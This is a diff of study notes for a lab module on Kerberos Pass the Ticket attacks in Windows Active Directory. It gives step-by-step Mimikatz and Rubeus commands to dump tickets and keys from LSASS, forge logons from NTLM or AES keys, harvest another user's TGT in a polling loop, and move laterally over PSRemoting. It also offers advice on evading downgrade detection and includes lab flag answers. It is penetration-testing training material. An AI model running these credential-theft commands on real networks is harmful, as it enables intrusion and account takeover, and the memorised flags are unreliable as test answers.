@@ -1,16 +1,16 @@
-# 🎫 Pass the Ticket (PtT) — Windows
+# Pass the Ticket (PtT) — Windows
 
 > **Module Section:** 21 / 26 — Password Attacks
 
 ## Overview
 
-**Pass the Ticket (PtT)** is an Active Directory lateral movement technique that uses a **stolen Kerberos ticket** (instead of an NTLM hash) to authenticate as another user.
+**Pass the Ticket (PtT)** is an Active Directory lateral movement technique. Instead of using an NTLM hash, it uses a stolen Kerberos ticket to authenticate as another user.
 
 ---
 
 ## Kerberos Refresher
 
-Kerberos is a **ticket-based** authentication system. Rather than sending passwords to every service, tickets are presented to prove identity.
+Kerberos is a ticket-based authentication system. Instead of sending passwords to every service, users receive tickets that prove their identity. Two ticket types matter for PtT attacks.
 
 | Ticket | Purpose |
 |--------|---------|
@@ -19,10 +19,10 @@ Kerberos is a **ticket-based** authentication system. Rather than sending passwo
 
 ### Authentication Flow
 
-1. Client encrypts the current timestamp with their password hash → sent to the **KDC** (Domain Controller)
-2. KDC validates identity (it knows the hash) → returns a **TGT**
-3. To access a service (e.g., MSSQL), client presents TGT to KDC → receives **TGS**
-4. Client presents TGS to target service → granted access
+1. The client encrypts the current timestamp with their password hash and sends it to the **KDC** (Key Distribution Center — the Domain Controller)
+2. The KDC validates the identity and returns a **TGT** (Ticket Granting Ticket)
+3. To access a service (e.g., MSSQL), the client presents the TGT to the KDC and receives a **TGS** (Ticket Granting Service ticket)
+4. The client presents the TGS to the target service and gets access
 
 ---
 
@@ -35,9 +35,9 @@ We need a valid Kerberos ticket, which can be:
 
 ---
 
-## 1️⃣ Harvesting Tickets from Windows
+## Harvesting Tickets from Windows
 
-Tickets are processed and stored by **LSASS**. As a **local administrator**, we can collect all tickets; otherwise, only our own.
+Tickets are stored by the LSASS (Local Security Authority Subsystem Service) process. As a local administrator you can collect all tickets. Without admin rights, you can only see your own.
 
 ### Mimikatz — Export All Tickets
 
@@ -46,6 +46,7 @@ c:\tools> mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets /export
 ```
+> Opens Mimikatz, enables debug privileges, and exports all Kerberos tickets from LSASS to `.kirbi` files on disk. Look for files with `krbtgt` in the name — those are TGTs.
 
 Exports `.kirbi` files to disk for every ticket in memory.
 
@@ -62,6 +63,7 @@ Exports `.kirbi` files to disk for every ticket in memory.
 ```cmd
 c:\tools> Rubeus.exe dump /nowrap
 ```
+> Dumps all Kerberos tickets from LSASS in Base64 format. `/nowrap` keeps each ticket on a single line for easy copy-paste. Better than Mimikatz on some Windows 10 builds where Mimikatz misreports the encryption type.
 
 Prints ticket in **Base64** instead of writing `.kirbi` files. Use `/nowrap` for easier copy-paste.
 
@@ -71,11 +73,9 @@ Prints ticket in **Base64** instead of writing `.kirbi` files. Use `/nowrap` for
 
 ---
 
-## 2️⃣ Pass the Key (OverPass the Hash)
+## Pass the Key (OverPass the Hash)
 
-Converts an **NTLM or AES key** into a full **TGT** via Kerberos — merging the PtH and PtT worlds.
-
-> Unlike classic PtH (which never touches Kerberos), OverPass the Hash uses the hash/key to obtain a real TGT.
+OverPass the Hash converts an NTLM or AES key into a full TGT via Kerberos. This bridges PtH and PtT. Unlike classic PtH (which never touches Kerberos), this technique obtains a real TGT that works with any Kerberos-aware service.
 
 ### Extract Kerberos Keys with Mimikatz
 
@@ -83,6 +83,7 @@ Converts an **NTLM or AES key** into a full **TGT** via Kerberos — merging the
 mimikatz # privilege::debug
 mimikatz # sekurlsa::ekeys
 ```
+> Dumps the encryption keys for all active Kerberos sessions. This gives you the AES256 key alongside the NTLM hash. Use the AES256 key to avoid encryption downgrade detection alerts.
 
 Output includes:
 - `aes256_hmac` key
@@ -94,6 +95,7 @@ Output includes:
 ```cmd
 mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
 ```
+> Uses the NTLM hash to open a new cmd.exe as the target user. Requires local admin. This version does NOT get a TGT — use Rubeus `asktgt` if you need a full Kerberos ticket.
 
 Opens a new `cmd.exe` running under the target user's context.
 
@@ -102,6 +104,7 @@ Opens a new `cmd.exe` running under the target user's context.
 ```cmd
 c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 ```
+> Requests a TGT from the KDC using the user's AES256 key. No admin required. `/nowrap` keeps output on one line for copy-paste. Use `/aes256` instead of `/rc4` to avoid downgrade detection.
 
 | Hash Flag | Key Type |
 |-----------|----------|
@@ -119,15 +122,16 @@ c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b2
 
 ---
 
-## 3️⃣ Pass the Ticket
+## Pass the Ticket
 
-Once we have a ticket, inject it into the current logon session.
+Once you have a ticket, inject it into the current logon session. After injection, the session behaves as the ticket owner for network authentication.
 
 ### Rubeus — Request + Import in One Step (`/ptt`)
 
 ```cmd
 c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
 ```
+> Requests a TGT and immediately injects it into the current session. `/ptt` (pass-the-ticket) skips saving to disk. Look for `[+] Ticket successfully imported!` in the output.
 
 Look for: `[+] Ticket successfully imported!`
 
@@ -136,18 +140,21 @@ Look for: `[+] Ticket successfully imported!`
 ```cmd
 c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
 ```
+> Injects a `.kirbi` ticket file into the current session. Replace the filename with the actual `.kirbi` file you exported from Mimikatz.
 
 ### Convert `.kirbi` → Base64 (PowerShell)
 
 ```powershell
 PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
 ```
+> Converts a `.kirbi` file to a Base64 string for easy copy-paste or use with Rubeus `/ticket:<base64>`.
 
 ### Rubeus — Import Base64 Ticket
 
 ```cmd
 c:\tools> Rubeus.exe ptt /ticket:<BASE64_TICKET>
 ```
+> Injects a Base64-encoded ticket directly without needing a file on disk. Paste the full Base64 string from the previous conversion step.
 
 ### Mimikatz — Import `.kirbi`
 
@@ -155,22 +162,22 @@ c:\tools> Rubeus.exe ptt /ticket:<BASE64_TICKET>
 mimikatz # privilege::debug
 mimikatz # kerberos::ptt "C:\path\to\ticket.kirbi"
 ```
+> Injects a `.kirbi` file into the current session using Mimikatz. After this, run `dir \\DC01\c$` or similar to test that the ticket is working.
 
 ### Verify Import
 
 ```cmd
 c:\tools> dir \\DC01.inlanefreight.htb\c$
 ```
+> Verifies the injected ticket works by listing the DC's C$ share. Use the FQDN, not an IP address — Kerberos matches tickets to hostnames, not IPs.
 
 > 💡 **Tip:** `misc::cmd` in Mimikatz opens a new `cmd.exe` window with the imported ticket — no need to exit and re-run commands.
 
 ---
 
-## 4️⃣ PtT + PowerShell Remoting (Lateral Movement)
+## PtT + PowerShell Remoting (Lateral Movement)
 
-**PowerShell Remoting** runs on:
-- **TCP/5985** (HTTP)
-- **TCP/5986** (HTTPS)
+PowerShell Remoting lets you run commands on remote hosts. It uses TCP/5985 (HTTP) and TCP/5986 (HTTPS). After injecting a ticket, you can use PSRemoting to access remote machines without entering credentials again.
 
 ### Required Group Membership
 
@@ -192,6 +199,7 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 [DC01]: PS C:\Users\john\Documents> whoami
 inlanefreight\john
 ```
+> Injects john's TGT with Mimikatz, then opens a PSRemoting session to DC01. After injection, Kerberos handles authentication automatically — no creds prompt.
 
 ### Rubeus — Sacrificial Process + PtT
 
@@ -200,12 +208,14 @@ Create an isolated logon session (Logon Type 9) so we don't trample the current 
 ```cmd
 C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 ```
+> Creates a new logon session (type 9) and opens a cmd.exe in it. This isolates the new TGT from your current session's tickets so you do not overwrite them.
 
 Then from the **new cmd window**, request a TGT and inject:
 
 ```cmd
 C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES256_KEY> /ptt
 ```
+> Requests a TGT using john's AES256 key and injects it into the isolated session created in the previous step. The `/ptt` flag imports immediately without writing a file.
 
 Then pivot:
 
@@ -215,6 +225,7 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 [DC01]: PS C:\Users\john\Documents> whoami
 inlanefreight\john
 ```
+> Opens a PSRemoting session using the injected ticket. Must use the FQDN `DC01` not an IP address for Kerberos to work.
 
 ---
 
@@ -278,12 +289,14 @@ RDP into MS01 as Administrator and dump tickets:
 mkdir C:\tickets && cd C:\tickets
 C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
 ```
+> Creates a working directory and dumps all Kerberos tickets to `.kirbi` files there. Count the files with `krbtgt` in the name — each one is a TGT.
 
 Or with Rubeus (cleaner output, Base64 instead of `.kirbi`):
 
 ```cmd
 C:\tools\Rubeus.exe dump /service:krbtgt /nowrap
 ```
+> Dumps only TGTs (tickets for the `krbtgt` service). Cleaner than exporting all tickets — use this when you just want to count or harvest TGTs.
 
 Initial dump shows **3 TGTs** for `krbtgt/INLANEFREIGHT.HTB`:
 - `DC01$` (LUID `0x39dc9`) — machine account, network logon
@@ -312,6 +325,7 @@ while ($true) {
     Start-Sleep -Seconds 30
 }
 ```
+> Polls every 30 seconds: clears old kirbi files, re-dumps tickets, and checks if john's TGT has appeared. John logs in via a scheduled task periodically — this loop catches it when it fires.
 
 Eventually yields e.g. `[0;4f3a1]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi`.
 
@@ -321,6 +335,7 @@ Eventually yields e.g. `[0;4f3a1]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kir
 C:\tools\mimikatz.exe "privilege::debug" "kerberos::ptt C:\tickets\[0;4f3a1]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi" exit
 klist
 ```
+> Injects john's TGT into the current session with Mimikatz, then runs `klist` to confirm. Look for `Client: john @ INLANEFREIGHT.HTB` in the output.
 
 Confirm `Client: john @ INLANEFREIGHT.HTB` with `Cache Flags: 0x1 -> PRIMARY`.
 
@@ -329,6 +344,7 @@ Confirm `Client: john @ INLANEFREIGHT.HTB` with `Cache Flags: 0x1 -> PRIMARY`.
 ```cmd
 net view \\DC01.inlanefreight.htb
 ```
+> Lists all shares on DC01 using the injected ticket. Must use the FQDN for Kerberos auth. The output shows which share names to use when reading flag files.
 
 Output reveals user-named shares: `carlos`, `david`, `john`, `julio`, `linux01`, `svc_workstations` (no `$` suffix — they're regular shares, not admin shares).
 
@@ -338,6 +354,7 @@ Output reveals user-named shares: `carlos`, `david`, `john`, `julio`, `linux01`,
 type \\DC01.inlanefreight.htb\john\flag.txt
 # → Learn1ng_M0r3_Tr1cks_with_J0hn
 ```
+> Reads the flag file over SMB using the injected TGT. Kerberos authenticates automatically — no password prompt.
 
 > ⚠️ **Path gotcha:** Initial guess `\\DC01\john$\flag.txt` fails — share is `john`, not `john$`. Always run `net view` first.
 
@@ -350,6 +367,7 @@ With john's TGT still in memory (or re-PtT if evicted), open a remote PowerShell
 ```powershell
 Enter-PSSession -ComputerName DC01.inlanefreight.htb
 ```
+> Opens an interactive PSRemoting session to DC01 using the TGT in cache. Kerberos auto-mints a service ticket for HTTP/WSMan. Must use FQDN.
 
 Kerberos auth is automatic — no creds prompted. `klist` after entering shows new service tickets minted on demand:
 - `HTTP/DC01.inlanefreight.htb` (WSMan / PSRemoting)
@@ -367,6 +385,7 @@ P4$$_th3_Tick3T_PSR
 ```powershell
 Invoke-Command -ComputerName DC01.inlanefreight.htb -ScriptBlock { type C:\john\john.txt }
 ```
+> Runs a command block on DC01 remotely and returns the output. Useful when you do not need an interactive session.
 
 > 💡 `Enter-PSSession` requires the FQDN for Kerberos SPN lookup — `Enter-PSSession DC01` (short name) may fall back to NTLM and fail without explicit creds.
 
